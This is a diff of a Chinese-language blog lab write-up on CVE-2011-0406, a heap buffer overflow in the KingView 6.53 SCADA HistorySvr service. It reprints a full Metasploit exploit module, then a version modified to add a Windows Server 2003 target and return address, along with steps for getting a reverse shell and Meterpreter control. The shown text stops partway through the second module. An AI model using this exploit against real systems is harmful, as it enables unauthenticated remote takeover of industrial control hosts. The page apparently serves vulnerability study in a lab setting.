@@ -6,7 +6,11 @@
 <h2 id="CVE-2011-0406"><a href="#CVE-2011-0406" class="headerlink" title="CVE-2011-0406"></a>CVE-2011-0406</h2><p>​        CVE-2011-0406 所描述的是亚控组态软件 KingView 6.53 存在的一个缓冲区溢出漏洞, 通过反汇编逆向分析结合动态调试可以发现该漏洞的成因,并可构造攻击代码对其所在上位 机进行攻击,进而获得上位机的远程控制权限。</p>
 <p>​        亚控组态软件 KingView 6.53 是运行在 windows 系列操作系统上的组态软件，是亚控 公司推出的一款针对中小型项目推出的用于监视与控制自动化设备和过程的 SCADA 产品, 支持连接 1000 多个厂家近 4000 种设备，支持包括主流 PLC、变频器、仪表、特殊模块、板 卡及电力、楼宇等协议。通过分析发现安装Ki䏰槖iew6.53 软件后，系统会启动 HistorySvr.exe 进程并会以系统服务形式在上位机中运行，该服务会在 TCP 的 777 端口监听接收数据，在 接收到数据后 HistorySvr.exe 程序会有 3 次拷贝操作，前两次各 0x4000 字节，最后一次 0xC 字节，共计 0x800C(32780)字节，在写入缓冲区时，对数据校验不严格导致堆缓冲区溢出 而执行任意代码。通过构造带有 shellcode 的恶意数据包向目标主机的 777 端口进行发送即 可触发该漏洞</p>
 <p>​        HistorySvr.exe 进程循环接收业务数据(传感器上报数据)，当接收到 异常格式的业务数据后进行数据处理时没有对数据长度进行严格校验，导致异常数据会覆盖缓冲区空间，当 CPU 按照指针地址执行指令时会跳转到攻击者设计好的 shellcode地址进行执行，导致执行攻击者构造的攻击代码。在实验过程中可以利用meatasploit攻击框架工具构造攻击代码，主要攻击载荷如下:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sploit&lt; &lt; make_nops(<span class="number">1020</span>)</span><br><span class="line">sploit&lt; &lt; <span class="string">&quot;\xC4\x04\x2B\x01&quot;</span></span><br><span class="line">sploit&lt; &lt; payload.encoded</span><br><span class="line">sploit&lt; &lt; <span class="string">&quot;x44&quot;</span>* (<span class="number">31752</span>-payload.encoded.length) 	</span><br><span class="line">sploit&lt; &lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="ruby">sploit&lt; &lt; make_nops(1020)
+sploit&lt; &lt; &quot;\xC4\x04\x2B\x01&quot;
+sploit&lt; &lt; payload.encoded
+sploit&lt; &lt; &quot;x44&quot;* (31752-payload.encoded.length)     
+sploit&lt; &lt; [target.ret].pack(&#39;V&#39;)</code></pre>
 <p>​        通过代码可看出数据包前 1020 位使用指令用来占位，接下来 4 位是我们构造的反向连接 shellcode 在内存空间中的地址，后面是加密后的shellcode 代码，然后用(31752-shellcode长度)位的 A 字符来填充补位，最后是用来覆盖 eax 寄存器的跳转地址。</p>
 <p>​        通过缓冲区溢出漏洞可覆盖 eax 寄存器的数据，导致程序执行到 call dword ptr[eax+c] 时指针跳转到 shellcode地址进行执行，在实际测试中可以使用metasploit构造不同类型的shellcode，可以构造反向连接类型 shellcode。使用metasploit进行攻击测试的时候需要设置 3 个参数，RHOST为远程上位机IP 地址，RPORT为 HistorySvr.exe 进程监听端口，payload为攻击载荷shellcode。</p>
 <p>​        设置好攻击目标及端口，并加载好shellcode 后可以使用 run命令进行攻击测试，攻击成功后会获得反向连接的控制权限，并可使用metasploit自带的工具meterpreter在远程机器上执行系统命令进行远程控制。</p>
@@ -15,7 +19,102 @@
 <p>​    Windows Server 2003:KingView 6.53<br>​    Kali Linux:metasploit、Python等</p>
 <p>​    网卡：Server2003 与Kali桥接为同一网卡</p>
 <h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h2><h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>​        收集 CVE-2011-0406 的信息和 EXP</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># $Id$</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This file is part of the Metasploit Framework and may be subject to</span></span><br><span class="line"><span class="comment"># redistribution and commercial restrictions. Please see the Metasploit</span></span><br><span class="line"><span class="comment"># Framework web site for more information on licensing and terms of use.</span></span><br><span class="line"><span class="comment"># http://metasploit.com/framework/</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">	Rank = GoodRanking</span><br><span class="line"></span><br><span class="line">	<span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info=&#123;&#125;)</span></span></span><br><span class="line">		<span class="keyword">super</span>(update_info(info,</span><br><span class="line">			<span class="string">&#x27;Name&#x27;</span>        =&gt; <span class="string">&quot;Kingview 6.53 SCADA HMI HistorySvr Heap Overflow&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">				This module exploits a buffer overflow in Kingview 6.53.  By sending a specially</span></span><br><span class="line"><span class="string">				crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to</span></span><br><span class="line"><span class="string">				gain arbitrary code execution without authentication.</span></span><br><span class="line"><span class="string">			&#125;</span>,</span><br><span class="line">			<span class="string">&#x27;License&#x27;</span>	  =&gt; MSF_LICENSE,</span><br><span class="line">			<span class="string">&#x27;Version&#x27;</span>	  =&gt; <span class="string">&quot;$Revision$&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;Author&#x27;</span>      =&gt;</span><br><span class="line">				[</span><br><span class="line">					<span class="string">&#x27;Dillon Beresford&#x27;</span>,  <span class="comment">#Found by Dillon</span></span><br><span class="line">					<span class="string">&#x27;rick2600&#x27;</span>,          <span class="comment">#XP SP3 execution</span></span><br><span class="line">				],</span><br><span class="line">			<span class="string">&#x27;References&#x27;</span> =&gt;</span><br><span class="line">				[</span><br><span class="line">					[<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2011-0406&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;OSVDB&#x27;</span>, <span class="string">&#x27;70366&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;Bugtraq&#x27;</span>, <span class="string">&#x27;45727&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://www.exploit-db.com/exploits/15957&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://www.kb.cert.org/vuls/id/180119&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#x27;</span>],</span><br><span class="line">				],</span><br><span class="line">			<span class="string">&#x27;Payload&#x27;</span>	 =&gt;</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x00\x0d\x0a\xff&quot;</span></span><br><span class="line">				&#125;,</span><br><span class="line">			<span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,	</span><br><span class="line">			<span class="string">&#x27;Targets&#x27;</span>	 =&gt;</span><br><span class="line">				[</span><br><span class="line">					[ <span class="string">&#x27;Windows XP SP1&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x77ED73B4</span>&#125; ], <span class="comment">#UnhandledExceptionFilter() in kernel32.dll</span></span><br><span class="line">					[ <span class="string">&#x27;Windows XP SP3 EN&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x00A1FB84</span>&#125; ],</span><br><span class="line">				],</span><br><span class="line">			<span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;9/28/2010&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">			register_options( [ Opt::RPORT(<span class="number">777</span>) ], <span class="keyword">self</span>.<span class="keyword">class</span> )</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">		sploit = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> target.name =~ <span class="regexp">/XP SP1/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">32812</span>)</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\xEB\x10&quot;</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x41&quot;</span>*<span class="number">6</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\xAD\xBB\xC3\x77&quot;</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">8</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x44&quot;</span>*(<span class="number">1000</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#this makes the app more crashy, need to investigatev</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; make_nops(1000-payload.encoded.length) </span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">elsif</span> target.name =~ <span class="regexp">/XP SP3/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">1024</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x44&quot;</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#rand_text_alpha_xxx() unfortunately makes it a bit unstable,</span></span><br><span class="line">			<span class="comment">#not ready to implement</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">		connect</span><br><span class="line"></span><br><span class="line">		print_status(<span class="string">&quot;Trying target <span class="subst">#&#123;target.name&#125;</span>&quot;</span>)</span><br><span class="line">		sock.write(sploit)</span><br><span class="line"></span><br><span class="line">		select(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">5</span>)</span><br><span class="line">		handler</span><br><span class="line">		disconnect</span><br><span class="line"></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<pre><code class="ruby">##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require &#39;msf/core&#39;
+
+class Metasploit3 &lt; Msf::Exploit::Remote
+    Rank = GoodRanking
+
+    include Msf::Exploit::Remote::Tcp
+
+    def initialize(info=&#123;&#125;)
+        super(update_info(info,
+            &#39;Name&#39;        =&gt; &quot;Kingview 6.53 SCADA HMI HistorySvr Heap Overflow&quot;,
+            &#39;Description&#39; =&gt; %q&#123;
+                This module exploits a buffer overflow in Kingview 6.53.  By sending a specially
+                crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to
+                gain arbitrary code execution without authentication.
+            &#125;,
+            &#39;License&#39;      =&gt; MSF_LICENSE,
+            &#39;Version&#39;      =&gt; &quot;$Revision$&quot;,
+            &#39;Author&#39;      =&gt;
+                [
+                    &#39;Dillon Beresford&#39;,  #Found by Dillon
+                    &#39;rick2600&#39;,          #XP SP3 execution
+                ],
+            &#39;References&#39; =&gt;
+                [
+                    [&#39;CVE&#39;, &#39;2011-0406&#39;],
+                    [&#39;OSVDB&#39;, &#39;70366&#39;],
+                    [&#39;Bugtraq&#39;, &#39;45727&#39;],
+                    [&#39;URL&#39;, &#39;http://www.exploit-db.com/exploits/15957&#39;],
+                    [&#39;URL&#39;, &#39;http://www.kb.cert.org/vuls/id/180119&#39;],
+                    [&#39;URL&#39;, &#39;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#39;],
+                ],
+            &#39;Payload&#39;     =&gt;
+                &#123;
+                    &#39;BadChars&#39; =&gt; &quot;\x00\x0d\x0a\xff&quot;
+                &#125;,
+            &#39;Platform&#39; =&gt; &#39;win&#39;,    
+            &#39;Targets&#39;     =&gt;
+                [
+                    [ &#39;Windows XP SP1&#39;, &#123;&#39;Ret&#39; =&gt; 0x77ED73B4&#125; ], #UnhandledExceptionFilter() in kernel32.dll
+                    [ &#39;Windows XP SP3 EN&#39;, &#123;&#39;Ret&#39; =&gt; 0x00A1FB84&#125; ],
+                ],
+            &#39;DisclosureDate&#39; =&gt; &quot;9/28/2010&quot;,
+            &#39;DefaultTarget&#39; =&gt; 0))
+
+            register_options( [ Opt::RPORT(777) ], self.class )
+    end
+
+    def exploit
+        sploit = &#39;&#39;
+        if target.name =~ /XP SP1/
+
+            sploit &lt;&lt; make_nops(32812)
+            sploit &lt;&lt; &quot;\xEB\x10&quot;
+            sploit &lt;&lt; &quot;\x41&quot;*6
+            sploit &lt;&lt; &quot;\xAD\xBB\xC3\x77&quot;
+            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)
+            sploit &lt;&lt; make_nops(8)
+            sploit &lt;&lt; payload.encoded
+            sploit &lt;&lt; &quot;\x44&quot;*(1000-payload.encoded.length)
+            #this makes the app more crashy, need to investigatev
+            #sploit &lt;&lt; make_nops(1000-payload.encoded.length) 
+
+        elsif target.name =~ /XP SP3/
+
+            sploit &lt;&lt; make_nops(1024)
+            sploit &lt;&lt; payload.encoded
+            sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)
+            #rand_text_alpha_xxx() unfortunately makes it a bit unstable,
+            #not ready to implement
+            #sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)
+            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)
+
+        end
+
+        connect
+
+        print_status(&quot;Trying target #&#123;target.name&#125;&quot;)
+        sock.write(sploit)
+
+        select(nil, nil, nil, 5)
+        handler
+        disconnect
+
+    end
+end</code></pre>
 <p>​        将 rb 脚本存放至 metasploit的相应安装目录中进行调用。 例如:/exploits/windows/scada</p>
 <p>​        开启 KingView6.53 打开软件预制 Kingdemo 工程。</p>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z7csvgf1j31h70tb1kx.jpg" alt="截屏2019-10-15下午9.24.03"></p>
@@ -36,22 +135,227 @@
 <p>​        观察程序发生异常时执行代码为mov cl, byte ptr  [eax + 5]，即程序将执行该指针位置处的指令，然而该地址值为 0x00B5084D，并未获取到可执行指令。</p>
 <p>​        利用代码针对目标为“windows XP SP3 EN”系统的返回地址 Ret 为异常时 EAX 寄存器 的值 0x00B50848。</p>
 <h3 id="修改利用代码"><a href="#修改利用代码" class="headerlink" title="修改利用代码"></a>修改利用代码</h3><p>​        重新打开漏洞利用代码进行编辑，targets 中加入“windows 2003 SP0 EN”，target.name 加入“2003 SP0”，Ret 值暂时随意填写，exploit 函数构造溢出包时，加入定位字符“ABCA” 便于我们定位 payload 地址位置，具体代码如下所示。</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">	Rank = GoodRanking</span><br><span class="line"></span><br><span class="line">	<span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info=&#123;&#125;)</span></span></span><br><span class="line">		<span class="keyword">super</span>(update_info(info,</span><br><span class="line">			<span class="string">&#x27;Name&#x27;</span>        =&gt; <span class="string">&quot;Kingview 6.53 SCADA HMI HistorySvr Heap Overflow&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">				This module exploits a buffer overflow in Kingview 6.53.  By sending a specially</span></span><br><span class="line"><span class="string">				crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to</span></span><br><span class="line"><span class="string">				gain arbitrary code execution without authentication.</span></span><br><span class="line"><span class="string">			&#125;</span>,</span><br><span class="line">			<span class="string">&#x27;License&#x27;</span>	  =&gt; MSF_LICENSE,</span><br><span class="line">			<span class="string">&#x27;Version&#x27;</span>	  =&gt; <span class="string">&quot;$Revision$&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;Author&#x27;</span>      =&gt;</span><br><span class="line">				[</span><br><span class="line">					<span class="string">&#x27;Dillon Beresford&#x27;</span>,  <span class="comment">#Found by Dillon</span></span><br><span class="line">					<span class="string">&#x27;rick2600&#x27;</span>,          <span class="comment">#XP SP3 execution</span></span><br><span class="line">				],</span><br><span class="line">			<span class="string">&#x27;References&#x27;</span> =&gt;</span><br><span class="line">				[</span><br><span class="line">					[<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2011-0406&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;OSVDB&#x27;</span>, <span class="string">&#x27;70366&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;Bugtraq&#x27;</span>, <span class="string">&#x27;45727&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://www.exploit-db.com/exploits/15957&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://www.kb.cert.org/vuls/id/180119&#x27;</span>],</span><br><span class="line">					[<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#x27;</span>],</span><br><span class="line">				],</span><br><span class="line">			<span class="string">&#x27;Payload&#x27;</span>	 =&gt;</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x00\x0d\x0a\xff&quot;</span></span><br><span class="line">				&#125;,</span><br><span class="line">			<span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,	</span><br><span class="line">			<span class="string">&#x27;Targets&#x27;</span>	 =&gt;</span><br><span class="line">				[</span><br><span class="line">					[ <span class="string">&#x27;Windows XP SP1&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x77ED73B4</span>&#125; ], <span class="comment">#UnhandledExceptionFilter() in kernel32.dll</span></span><br><span class="line">					[ <span class="string">&#x27;Windows XP SP3 EN&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x00A1FB84</span>&#125; ],</span><br><span class="line">					[ <span class="string">&#x27;Windows 2003 SP0 EN&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x00B50848</span>&#125; ],<span class="comment">#newtarget</span></span><br><span class="line">				],</span><br><span class="line">			<span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;9/28/2010&quot;</span>,</span><br><span class="line">			<span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">			register_options( [ Opt::RPORT(<span class="number">777</span>) ], <span class="keyword">self</span>.<span class="keyword">class</span> )</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">		sploit = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> target.name =~ <span class="regexp">/XP SP1/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">32812</span>)</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\xEB\x10&quot;</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x41&quot;</span>*<span class="number">6</span></span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\xAD\xBB\xC3\x77&quot;</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">8</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x44&quot;</span>*(<span class="number">1000</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#this makes the app more crashy, need to investigatev</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; make_nops(1000-payload.encoded.length) </span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">elsif</span> target.name =~ <span class="regexp">/XP SP3/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">1024</span>)</span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x44&quot;</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">			<span class="comment">#rand_text_alpha_xxx() unfortunately makes it a bit unstable,</span></span><br><span class="line">			<span class="comment">#not ready to implement</span></span><br><span class="line">			<span class="comment">#sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)</span></span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">		<span class="keyword">elsif</span> target.name =~ <span class="regexp">/2003 SP0/</span></span><br><span class="line"></span><br><span class="line">			sploit &lt;&lt; make_nops(<span class="number">1020</span>)</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;ABCA&quot;</span></span><br><span class="line">			sploit &lt;&lt; payload.encoded</span><br><span class="line">			sploit &lt;&lt; <span class="string">&quot;\x44&quot;</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">			sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">		connect</span><br><span class="line"></span><br><span class="line">		print_status(<span class="string">&quot;Trying target <span class="subst">#&#123;target.name&#125;</span>&quot;</span>)</span><br><span class="line">		sock.write(sploit)</span><br><span class="line"></span><br><span class="line">		select(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">5</span>)</span><br><span class="line">		handler</span><br><span class="line">		disconnect</span><br><span class="line"></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<pre><code class="ruby">require &#39;msf/core&#39;
+
+class Metasploit3 &lt; Msf::Exploit::Remote
+    Rank = GoodRanking
+
+    include Msf::Exploit::Remote::Tcp
+
+    def initialize(info=&#123;&#125;)
+        super(update_info(info,
+            &#39;Name&#39;        =&gt; &quot;Kingview 6.53 SCADA HMI HistorySvr Heap Overflow&quot;,
+            &#39;Description&#39; =&gt; %q&#123;
+                This module exploits a buffer overflow in Kingview 6.53.  By sending a specially
+                crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to
+                gain arbitrary code execution without authentication.
+            &#125;,
+            &#39;License&#39;      =&gt; MSF_LICENSE,
+            &#39;Version&#39;      =&gt; &quot;$Revision$&quot;,
+            &#39;Author&#39;      =&gt;
+                [
+                    &#39;Dillon Beresford&#39;,  #Found by Dillon
+                    &#39;rick2600&#39;,          #XP SP3 execution
+                ],
+            &#39;References&#39; =&gt;
+                [
+                    [&#39;CVE&#39;, &#39;2011-0406&#39;],
+                    [&#39;OSVDB&#39;, &#39;70366&#39;],
+                    [&#39;Bugtraq&#39;, &#39;45727&#39;],
+                    [&#39;URL&#39;, &#39;http://www.exploit-db.com/exploits/15957&#39;],
+                    [&#39;URL&#39;, &#39;http://www.kb.cert.org/vuls/id/180119&#39;],
+                    [&#39;URL&#39;, &#39;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#39;],
+                ],
+            &#39;Payload&#39;     =&gt;
+                &#123;
+                    &#39;BadChars&#39; =&gt; &quot;\x00\x0d\x0a\xff&quot;
+                &#125;,
+            &#39;Platform&#39; =&gt; &#39;win&#39;,    
+            &#39;Targets&#39;     =&gt;
+                [
+                    [ &#39;Windows XP SP1&#39;, &#123;&#39;Ret&#39; =&gt; 0x77ED73B4&#125; ], #UnhandledExceptionFilter() in kernel32.dll
+                    [ &#39;Windows XP SP3 EN&#39;, &#123;&#39;Ret&#39; =&gt; 0x00A1FB84&#125; ],
+                    [ &#39;Windows 2003 SP0 EN&#39;, &#123;&#39;Ret&#39; =&gt; 0x00B50848&#125; ],#newtarget
+                ],
+            &#39;DisclosureDate&#39; =&gt; &quot;9/28/2010&quot;,
